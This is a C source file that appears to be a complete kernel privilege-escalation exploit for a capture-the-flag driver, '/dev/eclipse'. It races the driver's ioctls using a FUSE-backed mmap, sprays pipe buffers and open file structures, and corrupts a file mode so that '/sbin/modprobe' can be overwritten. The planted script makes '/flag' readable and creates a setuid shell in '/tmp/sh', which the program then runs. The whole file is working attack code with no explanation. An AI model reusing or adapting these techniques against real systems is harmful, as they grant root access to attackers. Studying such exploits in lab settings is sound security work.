#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <errno.h>
#include <sched.h>
#include <string.h>
#include <liburing.h>
#include <signal.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/capability.h>
#include <sys/syscall.h>
#include <sys/msg.h>

#define FUSE_USE_VERSION 29
#define _FILE_OFFSET_BITS 64
#include <fuse.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)

#define asm __asm__

#define SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) logErr("%s:%d: returned 0x%lx", __FILE__, __LINE__, (u64)_r); \
    _r; \
});


u8 WAIT()
{
    write(STDERR_FILENO, "[WAITING...]\n", 13);
    u8 c;
    read(STDIN_FILENO, &c, 1);
    return c;
}

static inline void panic(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

int getattr_callback(const char *path, struct stat *stbuf);
int open_callback(const char *path, struct fuse_file_info *fi);
int read_callback(const char *path, char *buf, size_t size, off_t offset,
                      struct fuse_file_info *fi);

struct fuse_operations fops = {
  .getattr = getattr_callback,
  .open = open_callback,
  .read = read_callback,
};

#define mount_point "/tmp/fuse_mount"

_Bool setup_done;

void *fuse_thread(void *arg) {
    (void)arg;
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;
    if(mkdir(mount_point, 0777)){
        panic("mkdir(\"/tmp/fuse_mount\")");
    }
    if((chan = fuse_mount(mount_point,&args)) == NULL){
        panic("fuse_mount");
    }
    if((fuse = fuse_new(chan,&args,&fops,sizeof(fops),NULL)) == NULL){
        panic("fuse_new");
    }

    pin_cpu(0);
    
    fuse_set_signal_handlers(fuse_get_session(fuse));
    setup_done = 1;
    logInfo("Setup FUSE done");
    fuse_loop_mt(fuse);

    fuse_unmount(mount_point, chan);
    return NULL;
}

void *mmap_fuse_file(const char* filename) {

  char path[256] = {0};
  snprintf(path, sizeof(path), mount_point"/%s", filename);
    
    int fuse_fd = open(mount_point"/file",O_RDWR);
    if(fuse_fd == -1)
        panic("open");

    void* page = mmap(NULL,0x1000, PROT_WRITE | PROT_READ,MAP_PRIVATE,fuse_fd,0);

    if(page == MAP_FAILED)
        panic("mmap");
    logInfo("mmap %p", page);
    
    return page;
}

#define devfile "/dev/eclipse"
#define CMD_ALLOC   0xBAADC0DE
#define CMD_SHOW    0x1337C0DE
#define CMD_WRITE   0xCAFEBABE
#define CMD_REALLOC 0xFEEDC0DE


struct user_req {
    unsigned char *data;
    size_t size;
};

int devfd;

int eclipse_alloc(size_t size) {
  struct user_req req = {.size = size};
  return ioctl(devfd, CMD_ALLOC, &req);
}

int eclipse_write(void* data, size_t size) {
  struct user_req req = {.data = data, .size = size};
  return ioctl(devfd, CMD_WRITE, &req);
}

int eclipse_realloc(size_t size) {
  struct user_req req = {.size = size};
  return ioctl(devfd, CMD_REALLOC, &req);
}

#define ARR_SIZE(arr) sizeof(arr) / sizeof(arr[0])

int pipes[0x200][2];
int spray_files [0x300];

int main(int argc, char **argv, char **envp)
{
    pin_cpu(0);
  
    devfd = open(devfile, O_RDONLY);

    pthread_t th;
    pthread_create(&th, NULL, fuse_thread, NULL);
    while (!setup_done)
      ;

    usleep(1000);

try:

    void *p = mmap_fuse_file("file");

    for (uint i = 0; i < ARR_SIZE(pipes); ++i) {
        SAFE(pipe(pipes[i]));
    }

    eclipse_alloc(16*40);

    eclipse_write(p, 1);

    uint idx1 = -1, idx2 = -1;
    u64 var;

    for (uint i = 0; i < ARR_SIZE(pipes); i++) {
        if (i % 8) {
            read(pipes[i][0], &var, 8);
            if (var - 0xdeadbeef0000 != i && (var - 0xdeadbeef0000 < ARR_SIZE(pipes))) {
                idx1 = i;
                idx2 = var - 0xdeadbeef0000;
                break;
            }
        }
    }

    if (idx1 == -1 || idx2 == -1) {
        goto fail;
    }

    logOK("Found to dup pipes %u - %u", idx1, idx2);

    char dummy[68] = {0};
    write(pipes[idx1][1], dummy, sizeof dummy); // make offset to 68

    close(pipes[idx2][0]);
    close(pipes[idx2][1]);

    for (uint i = 0; i < ARR_SIZE(spray_files); ++i) {
        spray_files[i] = SAFE(open("/sbin/modprobe", O_RDONLY));
    }

    int mode = 0x480e801f;
    write(pipes[idx1][1], &mode, 4);

    const char *data = ("#!/bin/sh\n"
                        "chmod o+r /flag\n"
                        "cp /bin/sh /tmp/sh && chmod u+s /tmp/sh\n"
                        
    );
    const u64 data_size = strlen(data)+1;

    for (int i = 0; i < ARR_SIZE(spray_files); i++) {
        int retval = write(spray_files[i], data, data_size);
        if (retval > 0) {
            printf("Write Success:%d!\n", i);
            system("bash -c 'echo -en \"\\x13\\x13\\x13\\x13\" > /tmp/x' && chmod +x /tmp/x && /tmp/x ; /tmp/sh -p");
            break;
        }
        printf("%d\n", i);
    }

    return 0;

fail:
    logErr("Fail");
    for (uint i = 0; i < ARR_SIZE(pipes); i++) {
        if(i%8){
            close(pipes[i][0]);
            close(pipes[i][1]);
        }
    }
    goto try;
}


int open_callback(const char *path, struct fuse_file_info *fi) {
    fputs("[+] open_callback\n",stderr);
    return 0;
}


int getattr_callback(const char* path,struct stat* stbuf){
    fputs("[*] getattr called\n",stderr);
    memset(stbuf,0,sizeof(struct stat));
    if(strcmp(path,".")){
        stbuf->st_mode =  S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x100;
        return 0;
    }
    return -ENOENT;
}

int read_callback(const char *path, char *buf, size_t size, off_t offset,
                  struct fuse_file_info *fi) {
    fputs("[+] read_callback\n", stderr);

    for (uint i = 0; i < sizeof(pipes)/sizeof(pipes[0]) ; ++i) {
        if (i == ARR_SIZE(pipes)/2 + 1)
            eclipse_realloc(128);
        SAFE(fcntl(pipes[i][1], F_SETPIPE_SZ, 0x10 * 0x1000));
    }

    for (uint i = 0; i < ARR_SIZE(pipes); i += 8) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }

    for (uint i = 0; i < ARR_SIZE(pipes); i++) {
        if ((i % 8) ) {
            u64 pipe_magic = 0xdeadbeef0000 + i;
            write(pipes[i][1], &pipe_magic, 0x8);
        }
    }

    *(u8*)buf = 0x80;

    return size;
}